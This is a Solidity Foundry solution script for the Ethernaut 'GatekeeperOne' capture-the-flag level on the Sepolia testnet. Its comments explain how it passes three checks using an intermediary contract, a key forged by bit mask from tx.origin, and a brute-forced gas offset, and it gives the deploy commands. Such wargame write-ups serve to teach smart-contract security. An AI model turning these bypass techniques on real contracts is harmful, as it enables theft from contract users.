// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/GatekeeperOne.sol";

/*
    Solution script for the Ethernaut Level 13: GatekeeperOne

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in GatekeeperOneScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/GatekeeperOne.s.sol:GatekeeperOneScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/GatekeeperOne.s.sol/11155111
*/

contract GatekeeperOneAttack {
    constructor(address target) {
        /*
            Gate Three
            --------

            We need to code the solution for getting past Gate Three first.

            Gate THree has 3 parts:

            Part 1:
            
                uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)

                Recall that uint32 is 4 bytes and uint16 is 2 bytes and that in hex
                1 byte = 2 hex digits. So a uint32 will have 8 hex digits and a uint16
                will have 4 hex digits.

                Essentially a cast from uint32 to uint16 will set the first 4 hex digits 
                of the 32 bit number to zeros therefore requiring the following condition:

                0x B5 B6 B7 B8 == 0x 00 00 B7 B8 

                Therefore B5 & B6 must both == 00.

            Part 2: 

                uint32(uint64(_gateKey)) != uint64(_gateKey)

                This requires to satisfy the following condition:

                0x 00 00 00 00 B5 B6 B7 B8 != 0x B1 B2 B3 B4 B5 B6 B7 B8

                This shows that the bytes B1, B2, B3, and B4 can be anything but 0.

            Part 3: 

                uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))

                This requires to satisfy the following condition: 
                
                0x B5 B6 B7 B8 == 0x 00 00 (last two bytes of tx.origin)

                Therefore B7 and B8 will be the last two bytes of the address of our tx.origin.

            Combining Part 1, Part 2 and Part 3 will give us:

            0x    B1       B2      B3        B4    B5 B6              B7                      B8            
            0x ANY_DATA ANY_DATA ANY_DATA ANY_DATA 00 00 SECOND_LAST_BYTE_OF_ADDRESS LAST_BYTE_OF_ADDRESS

            Generating the key using bit masking

                To generate the gate key from the tx.origin we can use a bit mask 0xFFFFFFFF0000FFFF

                0x B1 B2 B3 B4 B5 B6 B7 B8 (last 8 bytes of tx.origin)
                      BITWISE AND
                0x FF FF FF FF 00 00 FF FF (our custom bit mask)

                As you can see this bit mask with AND operation will ensure that B5 B6 are zeros and the rest can 
                remain as the tx.origin bytes since that will satisfy the condition above.

        */
        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
        
        /*
            Gate Two
            --------
            gasleft() % 8191 == 0

            gasleft() tells us the remaining gas after the execution of the statement. To clear gate two, 
            we need to make sure that the statement gasleft() % 8191 == 0, i.e., our supplied gas input 
            should be a multiple of 8191.

            So the solution is to keep increasing the gas in multiples of 8191 until we get a success.
        */
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(target).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
    }
}

contract GatekeeperOneScript is Script {
    // replace instance with your level1 instance adddress
    address instance = 0x50C999c5b4a92B6d9eA8a8ccaF33Cd01df2693Ac;
    GatekeeperOne level13 = GatekeeperOne(instance);

    function run() external {
        vm.startBroadcast();

        require(level13.entrant() == address(0x0), 'entrant already updated');

        /*
            Gate One
            -------
            
            To pass Gate One we need to call GatekeeperOne enter function via 
            a separately deployed GatekeeperOneAttack contact such that the context in the 
            enter function will be

                msg.sender == GatekeeperOneAttack contract address
                tx.origin == attacker EOA address

            Since Gate Once checks that msg.sender != tx.origin this will pass Gate One.

            NOTE: Explainations for passing Gate Two and Gate Three can be found 
            in the GatekeeperOneAttack contract in line comments.
        */
        new GatekeeperOneAttack(instance);
        
        require(level13.entrant() == msg.sender, 'attacker not the entrant');

        vm.stopBroadcast();
    }
}
